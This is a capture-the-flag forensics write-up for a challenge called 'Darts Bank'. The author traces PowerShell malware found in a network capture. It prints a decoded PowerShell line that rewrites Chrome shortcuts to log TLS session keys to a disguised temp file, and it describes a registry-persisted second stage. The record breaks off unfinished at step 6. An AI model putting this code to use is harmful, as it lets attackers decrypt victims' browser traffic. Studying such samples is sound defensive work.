# Darts Bank

## Disclaimer
```
Attention : ce challenge contient du code à portée malveillante. Bien que l'auteur se soit efforcé de le rendre relativement inoffensif, il convient de prendre les mesures d'isolation adéquates s'il devait être exécuté. L'organisation décline toute responsabilité en cas de dommages à votre système.
```

## Speech
```
Je me dirigeais vers l'épreuve de lancer de fléchettes quand j'ai fait une découverte horrifiante : on m'a dérobé ma fléchette porte-bonheur ! Pourtant, cette dernière était bien sécurisée grâce à ma banque à fléchettes, DartsBank, et cette dernière a toutes les protections qui s'imposent... Même le petit cadenas vert ! Je crois avoir remarqué des choses étranges sur le réseau, vous pouvez y jeter un œil ?
```

## MD5
`a5d6bb16aaebbaae69de51ba653aa358`

## Analysis
1. Open the pcap in Wireshark
![Packets analysis](./img/00_packet_hierarchy.png)
2. Lots of TCP/HTTP, follow the TCP stream :
![powershell malware](./img/01_found_something.png)
3. Copy/paste in a new file (*powershell.mal*)
4. I try to deob
    - First look for semicolon and add new line after each ";" we finish with 5 line :
        - the first one is a base64 command, let's decode : `foreach($bbbbbbbbbbbb in Get-ChildItem -Recurse -Path C:\Users -ErrorAction SilentlyContinue -Include *.lnk){$bbbbbbbbbbbbbbb=New-Object -COM WScript.Shell;$bbbbbbbbbbbbbbbb=$bbbbbbbbbbbbbbb.CreateShortcut($bbbbbbbbbbbb);if($bbbbbbbbbbbbbbbb.TargetPath -match 'chrome\.exe$'){$bbbbbbbbbbbbbbbb.Arguments="--ssl-key-log-file=$env:TEMP\defender-res.txt";$bbbbbbbbbbbbbbbb.Save();}}` Looks like is doing something with the link of chrome.exe
        - the second is a very long base64 string
        - the third execute another base64 command : `Start-Process -WindowStyle Maximized https://hello.smyler.net` Nice one Smyler :)
        - on the fourth the very long base64 is written to run.ps1 
        - the last one put the run.ps1 in the registry
    - I decode run.ps1
5. run.ps1 seems to be a bit hard to decode, so let's fire up windows
![run.ps1](./img/02_run_ps1.png)
6. I modify top print things and not sleep. ERROR !! We need a file created by the first stage
